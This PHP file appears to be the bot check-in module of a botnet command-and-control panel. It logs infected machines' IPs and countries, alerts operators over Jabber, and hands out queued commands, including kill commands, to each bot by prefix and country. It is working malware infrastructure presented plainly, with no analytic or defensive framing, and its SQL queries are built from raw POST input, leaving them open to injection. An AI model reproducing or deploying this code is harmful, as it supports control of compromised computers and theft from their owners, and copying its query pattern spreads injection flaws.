<?php

if(DIEHACK != true) exit;

$mysqli->query("INSERT DELAYED INTO bf_bots_ip (prefix, uid, ip, country) VALUES ('".$_POST['prefix']."', '".$_POST['uid']."', '".$_SERVER['REMOTE_ADDR']."', '".$country."')");

if($bot->tracking == 1 && !empty($config['jabber']['tracking'])){
    if(function_exists('ioncube_read_file')){
        $text = @ioncube_read_file($dir . 'templates/modules/bots/bot_online.tpl');
    }else{
        $text = @file_get_contents($dir . 'templates/modules/bots/bot_online.tpl');
    }
    
    $text = str_replace('{UID}', $bot->prefix . $bot->uid, $text);
    $text = str_replace('{TIME}', date('d.m.Y H:i'), $text);
    $text = str_replace('{COUNTRY}', $bot->$country, $text);
    $text = str_replace('{IP}', $_SERVER['REMOTE_ADDR'], $text);
    
    if(strpos($config['jabber']['tracking'], ',') != false){
        $jt = explode(',', $config['jabber']['tracking']);
        if($jt > 0){
            foreach($jt as $jab){
                @file_put_contents($dir . 'cache/jabber/to_' . $jab . '_' . mt_rand(5, 15) . time(), $text);
            }
        }
    }else{
        @file_put_contents($dir . 'cache/jabber/to_' . $config['jabber']['tracking'] . '_' . mt_rand(5, 15) . time(), $text);
    }
    unset($text);
}

if(!empty($bot->cmd)){
    if(strpos($bot->cmd, '!') === 0){
        if(strpos($bot->cmd, '!!!') === 0){
            if($_POST['reboot'] == '1'){
                $mysqli->query('update bf_bots set ver = \''.$ver.'\', last_date = \''.$time.'\', ip = \''.$_SERVER['REMOTE_ADDR'].'\' WHERE (id = \''.$bot->id.'\') LIMIT 1');
            }else{
                $bot->cmd = '';
            }
        }if(strpos($bot->cmd, '!!') === 0){
            $mysqli->query('update bf_bots set ver = \''.$ver.'\', cmd = \'!!!'.preg_replace('~^[!]+~is', '', $bot->cmd).'\', last_date = \''.$time.'\', ip = \''.$_SERVER['REMOTE_ADDR'].'\' WHERE (id = \''.$bot->id.'\') LIMIT 1');
        }else{
            $mysqli->query('update bf_bots set ver = \''.$ver.'\', last_date = \''.$time.'\', ip = \''.$_SERVER['REMOTE_ADDR'].'\', country = \''.$country.'\' WHERE (id = \''.$bot->id.'\') LIMIT 1');
        }
    }else{
        $mysqli->query('update bf_bots set ver = \''.$ver.'\', cmd=\'\', last_date = \''.$time.'\', ip = \''.$_SERVER['REMOTE_ADDR'].'\', country = \''.$country.'\' WHERE (id = \''.$bot->id.'\') LIMIT 1');
    }
    
    if(!empty($bot->cmd)){
        if(strpos($bot->cmd, '$') === 0){
            $bot->cmd = preg_replace('~^[$]+~is', '', $bot->cmd);
            print_data($bot->cmd, false, true);
        }else{
            $bot->cmd = preg_replace('~^[!]+~is', '', $bot->cmd);
            if($bot->cmd != 'killibank' && $bot->cmd != 'killdiam'){
                print_data($bot->cmd, false, true);
            }else{
                print_data('kill', false, true);
            }
        }
    }
    exit;
}

$bot->cmd_history = @json_decode($bot->cmd_history, true);

$cmd_history = @array_keys($bot->cmd_history);
if(count($cmd_history) > 0) {
    $history_sql = '';
    foreach($cmd_history as $value){
        $history_sql .= ' AND (id != \''.$value.'\')';
    }
}

if($bot->notask == '0'){
    $cmds = $mysqli->query('SELECT * FROM bf_cmds WHERE (enable=\'1\') AND ((prefix LIKE \''.$bot->prefix.'|%\') OR (prefix LIKE \'%|'.$bot->prefix.'|%\') OR (prefix = \'*\')) AND ((country LIKE \'%'.$country.'|%\') OR (country = \'*\')) AND ((online = \'1\') OR (online = \'2\')) AND ((max = 0) OR (count < max))'.$history_sql.' ORDER by dev, lt, id DESC LIMIT 10', null, null, false);
}

if(count($cmds) > 0){
    foreach($cmds as $cmd){
        if($bot->cmd_history[$cmd->id] != true){
            $bot->cmd_history[$cmd->id] = true;
            //print_data($cmd->cmd, false, true);
            $cs .= $cmd->cmd . "\r\n";
            
            if($cmd->lt == '2'){
                $mysqli->query('update bf_bots set ver = \''.$ver.'\', cmd_history = \''.json_encode($bot->cmd_history).'\', notask = \''.$cmd->id.'\', ip = \''.$_SERVER['REMOTE_ADDR'].'\', last_date = \''.$time.'\' WHERE (id = \''.$bot->id.'\') LIMIT 1');
                print_data(rtrim($cs, "\r\n"), true, true);
                exit;
            }
            
            $mysqli->query('update bf_cmds set count = count+1 where (id = \''.$cmd->id.'\') LIMIT 1');
        }
    }
}

$sql_add = '';

if(($time - $bot->last_date) > $bot->max_post) $sql_add .= ', max_post = \'' . ($time - $bot->last_date) . '\'';

if($bot->min_post == 0 || ($time - $bot->last_date) < $bot->min_post) $sql_add .= ', min_post = \'' . ($time - $bot->last_date) . '\'';

if(!empty($cs)){
    $mysqli->query('update bf_bots set ver = \''.$ver.'\', cmd_history = \''.json_encode($bot->cmd_history).'\', country = \''.$country.'\', ip = \''.$_SERVER['REMOTE_ADDR'].'\', last_date = \''.$time.'\' '.$sql_add.' WHERE (id = \''.$bot->id.'\') LIMIT 1');
    print_data(rtrim($cs, "\r\n"), false, true);
}else{
    $sql_add = '';
    if(($time - $bot->last_date) > $bot->max_post) $sql_add .= ', max_post = \'' . ($time - $bot->last_date) . '\'';
    if($bot->min_post == 0 || ($time - $bot->last_date) < $bot->min_post) $sql_add .= ', min_post = \'' . ($time - $bot->last_date) . '\'';
    $mysqli->query('update bf_bots set ver = \''.$ver.'\', last_date = \''.$time.'\', ip = \''.$_SERVER['REMOTE_ADDR'].'\' '.$sql_add.' WHERE (id = \''.$bot->id.'\') LIMIT 1');
    unset($sql_add);
    print_data('no tasks');
}

unset($cmd_history);

?>